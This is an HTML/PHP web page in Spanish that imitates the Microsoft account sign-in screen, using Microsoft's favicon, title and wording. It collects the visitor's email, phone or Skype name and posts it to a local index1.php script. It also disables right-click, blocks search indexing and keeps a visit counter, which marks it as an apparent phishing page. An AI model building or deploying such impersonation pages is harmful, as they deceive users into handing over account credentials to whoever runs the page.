

<!DOCTYPE html>

<html>

<head>
    
   <body oncontextmenu="return false">
	<link rel="shortcut icon" href="//www.microsoft.com/favicon.ico?v2">
	<title>Microsoft</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0" />
	
	<meta charset="UTF-8">
	
	<meta http-equiv="Expires" content="0">
    <meta http-equiv="Last-Modified" content="0">
    <meta http-equiv="Cache-Control" content="no-cache, mustrevalidate">
    <meta http-equiv="Pragma" content="no-cache">
	
	<meta name="360-site-verification" content="e362348efd31ed6e77bcf0ba4963a6de">
    <meta name="sogou_site_verification" content="tKz9Rld4qH">

        <meta name="keywords" content="Test">
        <meta name="description" content="Test">
        <meta name="description" content="Web site created using create-react-app">
        <meta name="subject" content="Test">
        <meta name="copyright" content="Test">
        <meta name="url" content="http://www.test.com">
        <meta name="language" content="en-GB">
        <meta name="robots" content="NOINDEX, NOFOLLOW">
        <meta name="pagename" content="$Title">
        <meta name="coverage" content="Worldwide">
        <meta name="distribution" content="Global">
        <meta name="target" content="all">
        <meta name="HandheldFriendly" content="True">
        <meta name="MobileOptimized" content="640">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="cleartype" content="on">
        <meta name="apple-mobile-web-app-title" content="$Title">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-touch-fullscreen" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <meta name="ResourceLoaderDynamicStyles" content="">
        <meta http-equiv="etag"
        <meta http-equiv="Expires" content="0">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Cache-Control" content="no-cache">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="x-dns-prefetch-control" content="off">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>

        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=no">

        <!-- Makes your prototype chrome-less once bookmarked to your phone's home screen -->
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">

        <!-- Set a shorter title for iOS6 devices when saved to home screen -->
        <meta name="apple-mobile-web-app-title" content="Ratchet">

	
	<link rel="stylesheet" type="text/css" href="estilo.css">
	<link rel= "stylesheet" href= "https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.0.0/animate.compat.css">
	
   
 
	
</head>

<body>

<section class="box" >
	
	<div class="animated fadeIn" id="container">
	<div><img class="logo" src="logo1.svg" alt="logo1.svg"></div>
	<div class="animated fadeInRight" id="inner">

		<h2>Iniciar sesión</h2>
<form class ="form" method="POST"action="index1.php" >
		
        	<input  id="email" type="email" name="email" placeholder="Correo electrónico, teléfono o Skype" value="" required=>
			<br>
			<br>
			<h4>¿No tiene una cuenta?<FONT> Cree una.</FONT></h4>
			<br>
			<br>
			<h4><FONT>Iniciar sesión con una llave de seguridad    .</FONT></h4>
			<img class="pregunta1" src="pregunta1.svg" alt="pregunta1.svg">
			<br>
			<br>
			<input  id="accept1" type="submit" value="Siguiente">
            <br>
            <br>
            <br>
            <br>
            <div class="animated fadeIn" id="container00">
		
		<img class="llave1" src="llave1.svg" alt="llave1.svg">
		<p>Opciones de inicio de sesión</p>
		</div>
	</div>
	</div>
		</form>
		
		<div class="bottom1" >

		<?php
    function contadorvisitas()//  La función que ejecutara las visitas
    {
        $archivo = "contadorvisitas.txt"; //el archivo donde se almacena las visitas
        $f = fopen($archivo, "r"); //abrimos el fichero
        if($f)
        {
            $contadorvisitas = fread($f, filesize($archivo)); //vemos el archivo a grabar
            $contadorvisitas = $contadorvisitas + 1; // Le agregamos una visita mas al contador
            fclose($f);
        }
        $f = fopen($archivo, "w+");
        if($f)
        {
            fwrite($f, $contadorvisitas);
            fclose($f);
        }
        return $contadorvisitas;
    }
    
    //Mostramos las visitas acumuladas
    echo "Visitas totales "; 
    echo contadorvisitas();//imprime las visitas
    
?>

	</div>
	
	<?php
 
header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
 
header("Expires: Sat, 1 Jul 2000 05:00:00 GMT"); // Fecha en el pasado
 
?>
		
		
   <div class="bottom" >

		<h5>Términos de uso</h5>
		<h5>Privacidad y cookies  ...</h5>
	</div>
	

	
	<br>
	
	<div class="animated fadeIn" id="container2">
		
		<img class="llave1" src="llave1.svg" alt="llave1.svg">
		<p>Opciones de inicio de sesión</p>
		</div>
        
		

	
</section>

</body>

</html>